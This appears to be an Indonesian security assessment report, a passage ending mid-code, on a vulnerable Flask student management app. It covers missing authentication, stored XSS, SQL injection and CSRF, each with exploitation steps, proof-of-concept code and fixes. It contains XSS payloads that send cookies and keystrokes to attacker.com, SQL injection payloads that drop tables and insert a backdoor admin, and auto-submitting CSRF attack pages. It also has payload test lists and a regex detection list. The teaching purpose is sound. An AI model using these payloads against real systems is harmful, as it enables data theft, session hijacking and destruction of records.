# Laporan Analisis dan Peningkatan Keamanan Program
## Student Management System - Python Flask SQLite

---

## B. Hasil Analisis dan Peningkatan Keamanan Program

---

### **KERENTANAN 1: Tidak Ada Autentikasi dan Otorisasi**

#### **A. Deskripsi Kerentanan**
Aplikasi tidak memiliki sistem autentikasi dan otorisasi sama sekali. Semua endpoint dapat diakses oleh siapa saja tanpa perlu login atau verifikasi identitas. Tidak ada mekanisme untuk membedakan antara user biasa, admin, atau penyerang.

**Lokasi:**
- Semua routes di `app.py` (lines 20-71)
- Tidak ada middleware authentication
- Tidak ada session management

**Dampak:**
- Siapa saja dapat mengakses, menambah, mengedit, dan menghapus data siswa
- Tidak ada audit trail untuk tracking siapa yang melakukan perubahan
- Data sensitif dapat diakses oleh pihak tidak berwenang

---

#### **B. Cara Eksploitasi**

**Langkah-langkah eksploitasi:**

1. **Akses Langsung ke Endpoint:**
   ```bash
   # Siapa saja dapat mengakses aplikasi
   curl http://localhost:5000/
   ```

2. **Manipulasi Data Tanpa Login:**
   ```bash
   # Menghapus data siswa dengan ID tertentu
   curl http://localhost:5000/delete/1

   # Menambah data siswa palsu
   curl -X POST http://localhost:5000/add \
     -d "name=Hacker&age=99&grade=F"
   ```

3. **Akses dari Network Eksternal:**
   Karena aplikasi menggunakan `host='0.0.0.0'` di line 80, siapa saja di jaringan yang sama atau internet (jika exposed) dapat mengakses aplikasi.

**Proof of Concept:**
```python
import requests

# Tidak perlu login, langsung bisa delete
response = requests.get('http://target:5000/delete/1')
print(f"Deleted student without auth: {response.status_code}")

# Tidak perlu token, langsung bisa add
data = {'name': 'Unauthorized User', 'age': 20, 'grade': 'A'}
response = requests.post('http://target:5000/add', data=data)
print(f"Added student without auth: {response.status_code}")
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Data Breach:** Semua data siswa dapat diakses tanpa izin
2. **Data Manipulation:** Data dapat diubah atau dihapus tanpa jejak
3. **Data Loss:** Penyerang dapat menghapus seluruh database
4. **No Accountability:** Tidak ada cara untuk mengetahui siapa yang melakukan perubahan

**Dampak Bisnis:**
1. **Pelanggaran Privasi:** Melanggar regulasi perlindungan data (GDPR, dll)
2. **Kehilangan Kepercayaan:** Institusi kehilangan kredibilitas
3. **Kerugian Finansial:** Potensi denda dan biaya pemulihan
4. **Tuntutan Hukum:** Dari pihak yang datanya bocor atau dimanipulasi

**Severity: CRITICAL** (CVSS Score: 9.1)
- Mudah dieksploitasi
- Tidak memerlukan skill khusus
- Dampak sangat besar terhadap confidentiality, integrity, dan availability

---

#### **D. Rekomendasi Perbaikan**

**1. Implementasi Sistem Autentikasi**

```python
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash

# Setup Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Model User
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    role = db.Column(db.String(20), default='user')  # user, admin

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# Login endpoint
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):
            login_user(user)
            return redirect(url_for('index'))
        else:
            return 'Invalid credentials', 401
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))
```

**2. Implementasi Otorisasi (Role-Based Access Control)**

```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'admin':
            return 'Unauthorized', 403
        return f(*args, **kwargs)
    return decorated_function

# Proteksi endpoint
@app.route('/delete/<string:id>')
@login_required
@admin_required
def delete_student(id):
    # ... existing code
    pass

@app.route('/add', methods=['POST'])
@login_required
def add_student():
    # ... existing code
    pass

@app.route('/edit/<int:id>', methods=['GET', 'POST'])
@login_required
def edit_student(id):
    # ... existing code
    pass
```

**3. Implementasi Session Management yang Aman**

```python
import secrets

# Generate secret key yang kuat
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SESSION_COOKIE_SECURE'] = True  # Hanya via HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Tidak bisa diakses JavaScript
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # 30 menit
```

**4. Audit Logging**

```python
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(filename='audit.log', level=logging.INFO)

def log_action(action, user_id, details):
    logging.info(f"{datetime.now()} | User: {user_id} | Action: {action} | Details: {details}")

# Contoh penggunaan
@app.route('/delete/<string:id>')
@login_required
@admin_required
def delete_student(id):
    log_action('DELETE_STUDENT', current_user.id, f'Student ID: {id}')
    # ... existing code
```

**5. Rate Limiting**

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # ... existing code
    pass
```

**Priority: CRITICAL - Harus diperbaiki segera sebelum deployment**

---

---

### **KERENTANAN 2: Stored Cross-Site Scripting (XSS)**

#### **A. Deskripsi Kerentanan**
Aplikasi menggunakan filter `|safe` pada Jinja2 template yang menonaktifkan auto-escaping HTML. Ini memungkinkan penyerang menyimpan JavaScript malicious di database yang akan dieksekusi setiap kali halaman di-render.

**Lokasi:**
- `templates/index.html` line 29: `{{ student.name|safe }}`
- `templates/edit.html` lines 12, 14: Tidak ada escaping pada attributes

**Jenis XSS:** Stored/Persistent XSS (paling berbahaya)

**Dampak:**
- JavaScript malicious tersimpan di database
- Dieksekusi setiap kali user membuka halaman
- Dapat mencuri cookies, session tokens, atau melakukan aksi atas nama user

---

#### **B. Cara Eksploitasi**

**Langkah-langkah eksploitasi:**

1. **Injeksi Script melalui Form Add:**
   ```bash
   # Menambahkan student dengan nama yang mengandung XSS payload
   curl -X POST http://localhost:5000/add \
     -d "name=<script>alert('XSS')</script>&age=20&grade=A"
   ```

2. **Payload XSS yang Lebih Berbahaya:**
   ```html
   <!-- Cookie Stealing -->
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>

   <!-- Session Hijacking -->
   <script>
   new Image().src = 'http://attacker.com/log?data=' +
     encodeURIComponent(document.cookie + '|' + localStorage.getItem('token'));
   </script>

   <!-- Keylogger -->
   <script>
   document.addEventListener('keypress', function(e) {
     fetch('http://attacker.com/keys?k=' + e.key);
   });
   </script>

   <!-- Redirect ke Phishing -->
   <script>window.location='http://fake-login.com';</script>
   ```

3. **XSS via Edit Form:**
   ```bash
   # Mengubah nama student dengan payload XSS
   curl -X POST http://localhost:5000/edit/1 \
     -d "name=<img src=x onerror='alert(document.cookie)'>&age=20&grade=A"
   ```

4. **Persistent XSS yang Menyerang Admin:**
   ```javascript
   // Payload yang mencuri credentials admin
   <script>
   if(document.querySelector('form')) {
     document.querySelector('form').addEventListener('submit', function(e) {
       var formData = new FormData(e.target);
       fetch('http://attacker.com/steal-admin', {
         method: 'POST',
         body: formData
       });
     });
   }
   </script>
   ```

**Proof of Concept:**
```python
import requests

# PoC 1: Simple Alert
data = {
    'name': '<script>alert("XSS Vulnerability!")</script>',
    'age': 20,
    'grade': 'A'
}
requests.post('http://localhost:5000/add', data=data)

# PoC 2: Cookie Theft
data = {
    'name': '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
    'age': 20,
    'grade': 'A'
}
requests.post('http://localhost:5000/add', data=data)

# PoC 3: DOM Manipulation
data = {
    'name': '<img src=x onerror="document.body.innerHTML=\'<h1>HACKED</h1>\'">'
    'age': 20,
    'grade': 'A'
}
requests.post('http://localhost:5000/add', data=data)
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Session Hijacking:** Penyerang dapat mencuri session cookies user/admin
2. **Credential Theft:** Dapat mencuri username/password via keylogger atau fake form
3. **Malware Distribution:** Redirect user ke situs yang mengandung malware
4. **Defacement:** Mengubah tampilan website untuk semua user
5. **Phishing Attack:** Menampilkan fake login form untuk mencuri credentials
6. **Data Exfiltration:** Mencuri data sensitif yang ditampilkan di halaman

**Dampak Bisnis:**
1. **Compromised User Accounts:** Akun user dapat diambil alih
2. **Reputasi Damage:** Kehilangan kepercayaan pengguna
3. **Legal Issues:** Pelanggaran privacy dan data protection laws
4. **Financial Loss:** Biaya incident response dan remediation
5. **Business Disruption:** Website mungkin perlu dimatikan sementara

**Attack Scenarios:**
1. **Worm Attack:** XSS yang self-propagating (menyebar sendiri ke student lain)
2. **Admin Takeover:** Mencuri admin credentials ketika admin view data
3. **Mass Defacement:** Mengubah tampilan untuk semua visitors
4. **Cryptocurrency Mining:** Menjalankan mining script di browser victims

**Severity: HIGH to CRITICAL** (CVSS Score: 8.2)
- Persistent/Stored XSS lebih berbahaya dari Reflected XSS
- Affects all users who view the infected data
- Can lead to complete account compromise

---

#### **D. Rekomendasi Perbaikan**

**1. Hapus Filter |safe dan Gunakan Auto-Escaping**

```html
<!-- templates/index.html -->
<!-- SEBELUM (Vulnerable): -->
<td>{{ student.name|safe }}</td>

<!-- SESUDAH (Secure): -->
<td>{{ student.name }}</td>
<!-- Jinja2 akan otomatis escape HTML characters -->
```

**2. Implementasi Content Security Policy (CSP)**

```python
from flask import make_response

@app.after_request
def set_csp(response):
    # Strict CSP yang mencegah inline scripts
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://stackpath.bootstrapcdn.com; "
        "style-src 'self' https://stackpath.bootstrapcdn.com 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self' https://stackpath.bootstrapcdn.com; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self';"
    )
    return response
```

**3. Input Sanitization di Backend**

```python
import html
import bleach

def sanitize_input(text, allow_tags=None):
    """
    Sanitize user input untuk mencegah XSS
    """
    if allow_tags is None:
        # Tidak allow HTML tags sama sekali
        return html.escape(text)
    else:
        # Hanya allow specific safe tags
        return bleach.clean(
            text,
            tags=allow_tags,
            attributes={},
            strip=True
        )

@app.route('/add', methods=['POST'])
def add_student():
    # Sanitize semua input
    name = sanitize_input(request.form['name'])
    age = sanitize_input(request.form['age'])
    grade = sanitize_input(request.form['grade'])

    # ... rest of the code
```

**4. Output Encoding yang Proper**

```html
<!-- templates/edit.html -->
<!-- SEBELUM (Vulnerable): -->
<input type="text" name="name" value="{{ student.name }}" required>

<!-- SESUDAH (Secure): -->
<input type="text" name="name" value="{{ student.name | e }}" required>
<!-- Atau biarkan default auto-escape aktif -->
<input type="text" name="name" value="{{ student.name }}" required>
```

**5. Validation di Frontend dan Backend**

```python
from wtforms import Form, StringField, IntegerField, validators

class StudentForm(Form):
    name = StringField('Name', [
        validators.Length(min=1, max=100),
        validators.Regexp(r'^[a-zA-Z\s]+$', message='Hanya huruf dan spasi')
    ])
    age = IntegerField('Age', [
        validators.NumberRange(min=1, max=150)
    ])
    grade = StringField('Grade', [
        validators.Length(min=1, max=10),
        validators.Regexp(r'^[A-F][+-]?$', message='Format grade tidak valid')
    ])

@app.route('/add', methods=['POST'])
def add_student():
    form = StudentForm(request.form)
    if not form.validate():
        return 'Invalid input', 400

    # Sanitize after validation
    name = sanitize_input(form.name.data)
    age = form.age.data
    grade = sanitize_input(form.grade.data)

    # ... rest of the code
```

**6. Security Headers Tambahan**

```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

**7. Implementasi DOMPurify untuk Client-Side Protection**

```html
<!-- templates/index.html -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
<script>
  // Sanitize semua user-generated content di client side
  document.addEventListener('DOMContentLoaded', function() {
    const userContent = document.querySelectorAll('.user-content');
    userContent.forEach(function(element) {
      element.innerHTML = DOMPurify.sanitize(element.innerHTML);
    });
  });
</script>
```

**8. Testing untuk XSS**

```python
# Test cases untuk XSS
def test_xss_protection():
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<svg/onload=alert("XSS")>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
    ]

    for payload in xss_payloads:
        response = client.post('/add', data={
            'name': payload,
            'age': 20,
            'grade': 'A'
        })
        # Verify payload tidak dieksekusi
        assert '<script>' not in response.data.decode()
        assert 'onerror=' not in response.data.decode()
```

**Priority: HIGH - Harus segera diperbaiki**

---

---

### **KERENTANAN 3: SQL Injection (Multiple Locations)**

#### **A. Deskripsi Kerentanan**
Aplikasi menggunakan string interpolation (f-strings) untuk membuat SQL queries dengan input user yang tidak di-sanitize. Ini adalah kerentanan SQL Injection yang sangat berbahaya dan terdapat di multiple endpoints.

**Lokasi Vulnerable:**
1. `app.py:42` - INSERT query di `/add` endpoint
   ```python
   query = f"INSERT INTO student (name, age, grade) VALUES ('{name}', {age}, '{grade}')"
   ```

2. `app.py:52` - DELETE query di `/delete/<id>` endpoint
   ```python
   db.session.execute(text(f"DELETE FROM student WHERE id={id}"))
   ```

3. `app.py:65` - UPDATE query di `/edit/<id>` endpoint
   ```python
   db.session.execute(text(f"UPDATE student SET name='{name}', age={age}, grade='{grade}' WHERE id={id}"))
   ```

4. `app.py:70` - SELECT query di `/edit/<id>` endpoint
   ```python
   student = db.session.execute(text(f"SELECT * FROM student WHERE id={id}")).fetchone()
   ```

**Jenis:** Classic SQL Injection (In-Band)

---

#### **B. Cara Eksploitasi**

**1. SQL Injection via /add endpoint:**

```bash
# Bypass input validation dan inject SQL
curl -X POST http://localhost:5000/add \
  -d "name=John'); DROP TABLE student;--&age=20&grade=A"

# Query yang terbentuk:
# INSERT INTO student (name, age, grade) VALUES ('John'); DROP TABLE student;--', 20, 'A')
```

**2. SQL Injection via /delete endpoint:**

```bash
# Delete semua records
curl "http://localhost:5000/delete/1%20OR%201=1"

# Query yang terbentuk:
# DELETE FROM student WHERE id=1 OR 1=1
# Ini akan menghapus SEMUA student!
```

**3. SQL Injection via /edit endpoint:**

```bash
# Ubah semua grades
curl -X POST "http://localhost:5000/edit/1" \
  -d "name=John&age=20'; UPDATE student SET grade='F' WHERE '1'='1&grade=A"

# Query yang terbentuk:
# UPDATE student SET name='John', age=20'; UPDATE student SET grade='F' WHERE '1'='1', grade='A' WHERE id=1
```

**4. Data Exfiltration:**

```bash
# UNION-based SQL injection untuk extract data
curl -X POST http://localhost:5000/add \
  -d "name=x' UNION SELECT 1, username, password, 4 FROM users--&age=20&grade=A"
```

**5. Blind SQL Injection:**

```bash
# Time-based blind SQLi
curl "http://localhost:5000/delete/1%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20sleep(5)%20ELSE%201%20END)"
```

**Advanced Exploitation - Database Takeover:**

```python
import requests

# Step 1: Enumerate database structure
payloads = {
    'name': "x' UNION SELECT sql, type, name, 1 FROM sqlite_master--",
    'age': 20,
    'grade': 'A'
}
r = requests.post('http://localhost:5000/add', data=payloads)

# Step 2: Extract all data
payloads = {
    'name': "x' UNION SELECT GROUP_CONCAT(name), GROUP_CONCAT(age), GROUP_CONCAT(grade), 1 FROM student--",
    'age': 20,
    'grade': 'A'
}
r = requests.post('http://localhost:5000/add', data=payloads)

# Step 3: Create backdoor user (if users table exists)
payloads = {
    'name': "x'); INSERT INTO users (username, password, role) VALUES ('hacker', 'password123', 'admin');--",
    'age': 20,
    'grade': 'A'
}
r = requests.post('http://localhost:5000/add', data=payloads)

# Step 4: Drop tables
payloads = {
    'name': "x'); DROP TABLE student;--",
    'age': 20,
    'grade': 'A'
}
r = requests.post('http://localhost:5000/add', data=payloads)
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Complete Database Compromise:**
   - Read semua data di database (termasuk tabel lain)
   - Modify atau delete data apapun
   - Create user baru dengan privilege admin
   - Drop tables atau entire database

2. **Authentication Bypass:**
   - Jika ada tabel users, bisa extract credentials
   - Inject admin user untuk full access

3. **Data Exfiltration:**
   - Steal semua data sensitive
   - Export database structure dan contents

4. **Denial of Service:**
   - Drop critical tables
   - Execute expensive queries untuk overload server

5. **Privilege Escalation:**
   - SQLite memiliki functions yang bisa execute system commands (in some configurations)
   - Possible RCE in certain scenarios

**Dampak Bisnis:**
1. **Massive Data Breach:** Semua data siswa dapat dicuri
2. **Data Loss:** Database dapat dihapus sepenuhnya
3. **Regulatory Violations:** GDPR, FERPA, dan data protection laws
4. **Financial Loss:** Fines, lawsuits, recovery costs
5. **Reputational Damage:** Loss of trust dari students dan parents
6. **Legal Liability:** Institutional negligence
7. **Operational Disruption:** System downtime

**Real-World Impact:**
- SQLi adalah vulnerability #1 di OWASP Top 10
- Responsible untuk banyak major breaches (Equifax, TalkTalk, dll)
- Average cost of data breach: $4.24 million (IBM 2021 Report)

**Severity: CRITICAL** (CVSS Score: 9.8)
- Easy to exploit (low skill required)
- Complete database compromise possible
- No user interaction needed
- Network exploitable

---

#### **D. Rekomendasi Perbaikan**

**1. Gunakan Parameterized Queries (Prepared Statements)**

```python
# PERBAIKAN untuk /add endpoint
@app.route('/add', methods=['POST'])
def add_student():
    name = request.form['name']
    age = request.form['age']
    grade = request.form['grade']

    # SECURE: Menggunakan parameterized query
    db.session.execute(
        text("INSERT INTO student (name, age, grade) VALUES (:name, :age, :grade)"),
        {'name': name, 'age': age, 'grade': grade}
    )
    db.session.commit()
    return redirect(url_for('index'))

# PERBAIKAN untuk /delete endpoint
@app.route('/delete/<int:id>')  # Note: Changed to <int:id>
def delete_student(id):
    # SECURE: Menggunakan parameterized query
    db.session.execute(
        text("DELETE FROM student WHERE id = :id"),
        {'id': id}
    )
    db.session.commit()
    return redirect(url_for('index'))

# PERBAIKAN untuk /edit endpoint
@app.route('/edit/<int:id>', methods=['GET', 'POST'])
def edit_student(id):
    if request.method == 'POST':
        name = request.form['name']
        age = request.form['age']
        grade = request.form['grade']

        # SECURE: Menggunakan parameterized query
        db.session.execute(
            text("UPDATE student SET name=:name, age=:age, grade=:grade WHERE id=:id"),
            {'name': name, 'age': age, 'grade': grade, 'id': id}
        )
        db.session.commit()
        return redirect(url_for('index'))
    else:
        # SECURE: Menggunakan parameterized query
        student = db.session.execute(
            text("SELECT * FROM student WHERE id=:id"),
            {'id': id}
        ).fetchone()
        return render_template('edit.html', student=student)
```

**2. Gunakan ORM (Recommended Approach)**

```python
# BEST PRACTICE: Gunakan SQLAlchemy ORM
@app.route('/add', methods=['POST'])
def add_student():
    name = request.form['name']
    age = request.form['age']
    grade = request.form['grade']

    # ORM automatically handles SQL injection prevention
    new_student = Student(name=name, age=age, grade=grade)
    db.session.add(new_student)
    db.session.commit()
    return redirect(url_for('index'))

@app.route('/delete/<int:id>')
def delete_student(id):
    student = Student.query.get_or_404(id)
    db.session.delete(student)
    db.session.commit()
    return redirect(url_for('index'))

@app.route('/edit/<int:id>', methods=['GET', 'POST'])
def edit_student(id):
    student = Student.query.get_or_404(id)

    if request.method == 'POST':
        student.name = request.form['name']
        student.age = request.form['age']
        student.grade = request.form['grade']
        db.session.commit()
        return redirect(url_for('index'))

    return render_template('edit.html', student=student)

@app.route('/')
def index():
    # ORM query instead of raw SQL
    students = Student.query.all()
    return render_template('index.html', students=students)
```

**3. Input Validation dan Sanitization**

```python
from wtforms import ValidationError
import re

def validate_student_input(name, age, grade):
    """Validate and sanitize student input"""
    errors = []

    # Validate name
    if not name or len(name) > 100:
        errors.append("Name must be 1-100 characters")
    if not re.match(r'^[a-zA-Z\s\'-]+$', name):
        errors.append("Name contains invalid characters")

    # Validate age
    try:
        age_int = int(age)
        if age_int < 1 or age_int > 150:
            errors.append("Age must be between 1 and 150")
    except ValueError:
        errors.append("Age must be a number")

    # Validate grade
    if not re.match(r'^[A-F][+-]?$', grade):
        errors.append("Invalid grade format")

    return errors

@app.route('/add', methods=['POST'])
def add_student():
    name = request.form['name'].strip()
    age = request.form['age']
    grade = request.form['grade'].strip().upper()

    # Validate input
    errors = validate_student_input(name, age, grade)
    if errors:
        return {'errors': errors}, 400

    # Use ORM or parameterized query
    new_student = Student(name=name, age=int(age), grade=grade)
    db.session.add(new_student)
    db.session.commit()
    return redirect(url_for('index'))
```

**4. Database User dengan Least Privilege**

```python
# Konfigurasi database dengan user yang limited privileges
# Jangan gunakan root/admin user untuk aplikasi

# In production, gunakan database user yang hanya punya:
# - SELECT, INSERT, UPDATE, DELETE pada tables yang diperlukan
# - TIDAK PUNYA: DROP, CREATE, ALTER, GRANT privileges

# Example database configuration:
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///students.db'
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'connect_args': {
        'check_same_thread': False,
        'timeout': 10
    }
}
```

**5. Web Application Firewall (WAF) Rules**

```python
from flask import abort

def check_sql_injection(input_string):
    """Basic SQLi pattern detection"""
    sql_patterns = [
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)",
        r"(--|#|\/\*|\*\/)",
        r"(\bOR\b.*=.*)",
        r"(\bAND\b.*=.*)",
        r"(;.*)",
        r"(\'.*--)",
        r"(\".*--)",
    ]

    for pattern in sql_patterns:
        if re.search(pattern, input_string, re.IGNORECASE):
            return True
    return False

@app.before_request
def check_for_sql_injection():
    """Check all request parameters for SQL injection attempts"""
    for key, value in request.form.items():
        if isinstance(value, str) and check_sql_injection(value):
            abort(400, "Malicious input detected")

    for key, value in request.args.items():
        if isinstance(value, str) and check_sql_injection(value):
            abort(400, "Malicious input detected")
```

**6. Logging dan Monitoring**

```python
import logging

# Setup logging untuk detect SQLi attempts
logging.basicConfig(
    filename='security.log',
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

@app.before_request
def log_suspicious_activity():
    """Log potentially malicious requests"""
    for key, value in request.form.items():
        if check_sql_injection(str(value)):
            logging.warning(
                f"SQLi attempt detected - IP: {request.remote_addr}, "
                f"Endpoint: {request.endpoint}, Parameter: {key}, Value: {value}"
            )
```

**7. Testing untuk SQL Injection**

```python
# Automated SQLi testing
def test_sql_injection_protection():
    sqli_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE student;--",
        "1' UNION SELECT NULL--",
        "1' AND 1=1--",
        "admin'--",
        "' OR 1=1--",
        "1; DELETE FROM student WHERE '1'='1",
    ]

    for payload in sqli_payloads:
        # Test POST endpoints
        response = client.post('/add', data={
            'name': payload,
            'age': 20,
            'grade': 'A'
        })
        assert response.status_code != 500  # Should not cause error

        # Test GET endpoints
        response = client.get(f'/delete/{payload}')
        assert response.status_code in [400, 404]  # Should reject
```

**Priority: CRITICAL - Immediate fix required**

---

---

### **KERENTANAN 4: Cross-Site Request Forgery (CSRF)**

#### **A. Deskripsi Kerentanan**
Aplikasi tidak memiliki perlindungan CSRF (Cross-Site Request Forgery) pada semua form dan state-changing operations. Penyerang dapat membuat website malicious yang mengirim request ke aplikasi atas nama victim yang sudah login.

**Lokasi:**
- Semua POST endpoints tidak memiliki CSRF token validation
- `/add` endpoint (POST)
- `/edit/<id>` endpoint (POST)
- `/delete/<id>` endpoint (GET) - Extra vulnerable karena menggunakan GET untuk delete

**Dampak:**
- Penyerang dapat membuat victim menambah, edit, atau delete data tanpa sepengetahuan victim
- State-changing operations dapat dilakukan dari external websites

---

#### **B. Cara Eksploitasi**

**Skenario Attack:**
1. Victim login ke aplikasi student management di `http://localhost:5000`
2. Victim mengunjungi website attacker di tab lain
3. Website attacker mengirim invisible request ke aplikasi
4. Request berhasil karena browser victim mengirim session cookies

**Exploit 1: Delete Student via CSRF**

```html
<!-- Website attacker: malicious.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
</head>
<body>
    <h1>Congratulations! You've won a prize!</h1>
    <p>Click the button below to claim:</p>

    <!-- Invisible CSRF attack -->
    <img src="http://localhost:5000/delete/1" style="display:none;">
    <img src="http://localhost:5000/delete/2" style="display:none;">
    <img src="http://localhost:5000/delete/3" style="display:none;">

    <!-- Victim tidak sadar bahwa students sedang dihapus -->
</body>
</html>
```

**Exploit 2: Add Malicious Student via CSRF**

```html
<!-- Website attacker -->
<!DOCTYPE html>
<html>
<body>
    <h1>Loading...</h1>

    <!-- Auto-submit form -->
    <form id="csrf-form" action="http://localhost:5000/add" method="POST" style="display:none;">
        <input type="text" name="name" value="<script>alert('Hacked')</script>">
        <input type="number" name="age" value="666">
        <input type="text" name="grade" value="F">
    </form>

    <script>
        // Auto-submit when page loads
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Exploit 3: Mass Edit via CSRF**

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Please wait...</h1>

    <script>
        // CSRF attack to edit multiple students
        const studentIds = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

        studentIds.forEach(id => {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `http://localhost:5000/edit/${id}`;

            const fields = {
                name: 'CSRF Victim',
                age: 99,
                grade: 'F'
            };

            for (let key in fields) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            }

            document.body.appendChild(form);
            form.submit();
        });
    </script>
</body>
</html>
```

**Exploit 4: Combined XSS + CSRF Attack**

```html
<!-- Attacker combines CSRF with XSS injection -->
<!DOCTYPE html>
<html>
<body>
    <script>
        // Inject XSS payload via CSRF
        const xssPayload = '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>';

        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://localhost:5000/add';

        const nameInput = document.createElement('input');
        nameInput.name = 'name';
        nameInput.value = xssPayload;

        const ageInput = document.createElement('input');
        ageInput.name = 'age';
        ageInput.value = '20';

        const gradeInput = document.createElement('input');
        gradeInput.name = 'grade';
        gradeInput.value = 'A';

        form.appendChild(nameInput);
        form.appendChild(ageInput);
        form.appendChild(gradeInput);

        document.body.appendChild(form);
        form.submit();
    </script>
</body>
</html>
```

**Python PoC:**

```python
import requests

# Simulate CSRF attack
def csrf_attack_demo():
    # Assume victim has active session
    # Attacker's website triggers this

    # Delete students
    for i in range(1, 11):
        requests.get(f'http://localhost:5000/delete/{i}')

    # Add malicious student
    data = {
        'name': '<script>alert("CSRF Attack")</script>',
        'age': 999,
        'grade': 'F'
    }
    requests.post('http://localhost:5000/add', data=data)

    print("CSRF Attack completed!")
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Unauthorized Actions:**
   - Attacker dapat perform actions atas nama victim
   - Menambah, edit, delete data tanpa consent

2. **Data Integrity Compromise:**
   - Data dapat dimodifikasi tanpa audit trail yang valid
   - Corruption of database records

3. **Account Takeover (jika ada settings page):**
   - Change email/password via CSRF
   - Link account to attacker's email

4. **Privilege Escalation:**
   - Jika victim adalah admin, attacker dapat perform admin actions

**Dampak Bisnis:**
1. **Data Corruption:** Records yang tidak valid atau malicious
2. **Loss of Trust:** Users tidak percaya dengan data integrity
3. **Compliance Issues:** Audit trail yang tidak reliable
4. **Legal Liability:** Unauthorized modifications
5. **Operational Impact:** Cleanup and data restoration costs

**Attack Scenarios:**
1. **Social Engineering + CSRF:**
   - Attacker kirim email dengan link ke malicious page
   - Victim yang sudah login click link
   - Automatic CSRF attack executed

2. **Watering Hole Attack:**
   - Attacker compromise website yang sering dikunjungi victim
   - Inject CSRF payload
   - All logged-in users affected

3. **Malvertising:**
   - CSRF code di malicious ads
   - Affects anyone who views the ad while logged in

**Severity: MEDIUM to HIGH** (CVSS Score: 6.5)
- Requires user interaction (visit malicious site)
- But combined with social engineering, highly effective
- Can cause significant data integrity issues

---

#### **D. Rekomendasi Perbaikan**

**1. Implementasi CSRF Token dengan Flask-WTF**

```python
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect
from wtforms import StringField, IntegerField, SubmitField
from wtforms.validators import DataRequired, Length

# Enable CSRF protection
csrf = CSRFProtect(app)
app.config['SECRET_KEY'] = 'your-secret-key-here-change-in-production'

# Create forms with CSRF protection
class StudentForm(FlaskForm):
    name = StringField('Name', validators=[DataRequired(), Length(max=100)])
    age = IntegerField('Age', validators=[DataRequired()])
    grade = StringField('Grade', validators=[DataRequired(), Length(max=10)])
    submit = SubmitField('Submit')

# Update routes to use forms
@app.route('/add', methods=['GET', 'POST'])
def add_student():
    form = StudentForm()
    if form.validate_on_submit():
        new_student = Student(
            name=form.name.data,
            age=form.age.data,
            grade=form.grade.data
        )
        db.session.add(new_student)
        db.session.commit()
        return redirect(url_for('index'))
    return render_template('add.html', form=form)
```

**2. Update Templates dengan CSRF Token**

```html
<!-- templates/index.html -->
<form action="/add" method="POST">
    {{ form.csrf_token }}  <!-- CSRF token -->

    {{ form.name(class="form-control", placeholder="Name") }}
    {{ form.age(class="form-control", placeholder="Age") }}
    {{ form.grade(class="form-control", placeholder="Grade") }}

    <button type="submit" class="btn btn-primary">Add Student</button>
</form>

<!-- Or manual CSRF token -->
<form action="/add" method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">

    <input type="text" name="name" placeholder="Name" required>
    <input type="number" name="age" placeholder="Age" required>
